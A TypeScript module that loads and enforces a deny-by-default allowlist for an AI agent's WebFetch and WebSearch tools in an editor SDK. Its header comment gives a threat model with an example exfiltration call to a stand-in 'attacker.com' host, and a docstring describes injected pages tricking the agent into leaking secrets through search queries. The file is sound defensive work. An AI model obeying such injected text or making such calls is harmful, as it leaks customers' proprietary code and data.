/**
 * Web-tool security policy for the editor SDK runtime. Loaded from
 * the same `desde.config.json` as the read-roots
 * registry but returned as a separate object so the security check in
 * `canUseTool` can stay simple.
 *
 * Default policy: **everything denied**. Customers opt in to web
 * tools by adding a `webFetch` / `webSearch` block to the config —
 * the agent then sees those tools listed in its preamble. Without
 * config, calls return a deny message that explains how to enable
 * them.
 *
 * The threat model: the editor reads iframe page state and external
 * read-roots (potentially proprietary code). A prompt injection in a
 * prototype page could exfiltrate via `WebFetch("https://attacker.com/?data=...")`.
 * The customer's allowlist makes that an explicit decision, not an
 * accidental one.
 */


import { readEditorConfigFile } from './config-filename'

/**
 * Resolved policy passed to `canUseTool`. Defaults to "everything
 * denied" so omitting it from a session is equivalent to no web
 * tools.
 */
export interface WebPolicy {
  /**
   * Host patterns (exact match, case-insensitive) that `WebFetch` is
   * allowed to reach. Empty/absent ⇒ WebFetch denied. We deliberately
   * use exact-host match rather than substring or glob — editors
   * can list multiple hosts but cannot inadvertently allow wildcards.
   */
  webFetchAllowedHosts: ReadonlyArray<string>
  /**
   * Whether `WebSearch` is enabled at all. Lower-risk than WebFetch's
   * arbitrary-URL fetch, but NOT zero exfiltration risk: the query
   * string IS sent to an external search provider and is visible to
   * the SDK's tool runtime. A prompt-injected page can try to trick
   * the agent into searching for secrets. Defaults to false. Enable
   * only when you trust the agent + iframe content not to leak via
   * search queries.
   */
  webSearchEnabled: boolean
}

export const DEFAULT_WEB_POLICY: WebPolicy = {
  webFetchAllowedHosts: [],
  webSearchEnabled: false,
}

const CONFIG_FILENAME = 'desde.config.json'

interface RawWebPolicyConfig {
  webFetch?: { allowedHosts?: ReadonlyArray<string> }
  webSearch?: { enabled?: boolean }
}

export type LoadWebPolicyResult =
  | { ok: true; policy: WebPolicy; warnings: string[] }
  | { ok: false; errors: string[] }

/**
 * Load the web-policy section from `desde.config.json`.
 * Missing config / missing section ⇒ {@link DEFAULT_WEB_POLICY}.
 * Malformed values surface as errors.
 */
export async function loadWebPolicy(opts: {
  worktreeRoot: string
}): Promise<LoadWebPolicyResult> {
  // Reads the current filename, falling back to the pre-rename one so a
  // repo written before the Composer -> Editor rename keeps working.
  const found = await readEditorConfigFile(opts.worktreeRoot)
  // Report whichever file we actually read, so an error about a legacy
  // config names the legacy file rather than one that isn't there.
  const configName = found?.filename ?? CONFIG_FILENAME
  let raw: string
  try {
    if (found === null) throw Object.assign(new Error('absent'), { code: 'ENOENT' })
    raw = found.text
  } catch (err) {
    if ((err as NodeJS.ErrnoException).code === 'ENOENT') {
      return { ok: true, policy: DEFAULT_WEB_POLICY, warnings: [] }
    }
    return { ok: false, errors: [`${configName}: ${(err as Error).message}`] }
  }
  let parsed: RawWebPolicyConfig
  try {
    parsed = JSON.parse(raw) as RawWebPolicyConfig
  } catch (err) {
    return { ok: false, errors: [`${configName}: ${(err as Error).message}`] }
  }
  const warnings: string[] = []
  const errors: string[] = []

  const webFetchAllowedHosts: string[] = []
  if (parsed.webFetch !== undefined) {
    if (typeof parsed.webFetch !== 'object' || parsed.webFetch === null) {
      errors.push(`${configName}: "webFetch" must be an object`)
    } else if (parsed.webFetch.allowedHosts !== undefined) {
      const hosts = parsed.webFetch.allowedHosts
      if (!Array.isArray(hosts)) {
        errors.push(`${configName}: "webFetch.allowedHosts" must be an array of strings`)
      } else {
        for (const h of hosts) {
          if (typeof h !== 'string' || h.length === 0) {
            errors.push(
              `${configName}: "webFetch.allowedHosts" entry must be a non-empty string`,
            )
            continue
          }
          const lower = h.toLowerCase()
          if (lower.includes('*') || lower.includes('://')) {
            errors.push(
              `${configName}: "webFetch.allowedHosts" entry "${h}" must be a bare hostname (no scheme, no wildcard)`,
            )
            continue
          }
          webFetchAllowedHosts.push(lower)
        }
      }
    }
  }

  let webSearchEnabled = false
  if (parsed.webSearch !== undefined) {
    if (typeof parsed.webSearch !== 'object' || parsed.webSearch === null) {
      errors.push(`${configName}: "webSearch" must be an object`)
    } else if (parsed.webSearch.enabled !== undefined) {
      if (typeof parsed.webSearch.enabled !== 'boolean') {
        errors.push(`${configName}: "webSearch.enabled" must be a boolean`)
      } else {
        webSearchEnabled = parsed.webSearch.enabled
      }
    }
  }

  if (errors.length > 0) {
    return { ok: false, errors }
  }

  return {
    ok: true,
    policy: { webFetchAllowedHosts, webSearchEnabled },
    warnings,
  }
}

/**
 * Pure helper: parse a URL string and return the host (lowercased).
 * Returns null when the URL is unparseable or uses a non-http(s) scheme.
 * Used by `canUseTool` to decide WebFetch denials.
 */
export function extractHostForWebFetch(url: unknown): string | null {
  if (typeof url !== 'string' || url.length === 0) return null
  let parsed: URL
  try {
    parsed = new URL(url)
  } catch {
    return null
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null
  return parsed.hostname.toLowerCase()
}

/**
 * Decide whether a given URL is allowed under a policy. Returns
 * `{ ok: true }` when allowed, `{ ok: false, reason }` otherwise.
 * Used inside `canUseTool` so the same logic is reusable in tests.
 */
export function isWebFetchAllowed(
  policy: WebPolicy,
  url: unknown,
): { ok: true; host: string } | { ok: false; reason: string } {
  if (policy.webFetchAllowedHosts.length === 0) {
    return {
      ok: false,
      reason:
        'WebFetch is disabled. Add `"webFetch": {"allowedHosts": ["example.com", ...]}` to desde.config.json to enable. See the docs for the threat model.',
    }
  }
  const host = extractHostForWebFetch(url)
  if (host === null) {
    return { ok: false, reason: `WebFetch: invalid or non-http(s) URL ${JSON.stringify(url)}` }
  }
  if (!policy.webFetchAllowedHosts.includes(host)) {
    return {
      ok: false,
      reason: `WebFetch denied: host "${host}" is not in the allowlist. Configured hosts: ${policy.webFetchAllowedHosts.join(', ') || '(none)'}.`,
    }
  }
  return { ok: true, host }
}
